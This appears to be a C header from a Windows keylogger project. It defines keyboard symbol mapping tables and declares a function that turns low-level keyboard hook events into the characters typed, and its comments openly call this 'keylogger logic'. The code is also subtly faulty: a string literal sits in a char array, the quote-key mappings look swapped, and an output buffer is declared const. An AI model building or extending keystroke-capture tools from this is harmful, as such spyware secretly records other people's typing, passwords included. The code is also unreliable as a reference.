#pragma once
#include <windows.h>
#include <wchar.h>

/***** Mapping Keyboard Symbols w and w/o Shift ******/
// VirtualKey Codes: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
// Mapping symbols of '0'..'9' to ')'..'('
static char const cMapNumericShiftSymbols[] = { ')', '!', '@', '#', '$', '%', '^', '&', '*', '(' };
// Mapping symbols of VK 0xBA - 0xDE			  
//														0xBA 0xBB 0xBC 0xBD 0xBE 0xBF 0xC0
//	OEM_[X] <--											 1    +   ,    -    .    2    3
static char const cMapOEMSymbols_1[]				= { ';', '=', ',', '-', '.', '/', '`' };
static char const cMapOEMShiftSymbols_1[]			= { ':', '+', '<', '_', '>', '?', '~' };
static DWORD const dwMapOEMSymbols1_Start			= 0xBA;
static DWORD const dwMapOEMSymbols1_End				= 0xC0;

//												   0xDB 0xDC  0xDD 0xDE
//	OEM_[X] <--										 4    5     6    7  
static char const cMapOEMSymbols_2[]			= { '[', '\\', ']', '\"' };
static char const cMapOEMShiftSymbols_2[]		= { '{', '|',  '}', "'" };
static DWORD const dwMapOEMSymbols2_Start		= 0xDB;
static DWORD const dwMapOEMSymbols2_End			= 0xDE;

// Wrappers for special keys
static WCHAR * wcWrapperPrefix = L"[";
static WCHAR * wcWrapperSuffix = L"]";
/**************************************************************/

/* Get actual key description keylogger logic */
// This function will translate a pressed key to its actual descrption.
//	The function will consider the state of special keys such as Shift, Capslock, and will translate accordingly.
//	More over, the function will take into its considiration the current keyboard state and will get the actual value of the pressed key
//	in the relevant language.
// VirtualKey Codes: https://docs.microsoft.com/en-us/windows/desktop/inputdev/virtual-key-codes
// Will return True if translation was made, otherwise false (for example in case of a single shift pressed)
BOOL GetActualKeyDescription(__in KBDLLHOOKSTRUCT *keyboardStruct, __in DWORD dwKeyDescriptionSize, __out LPCSTR wcKeyDescription);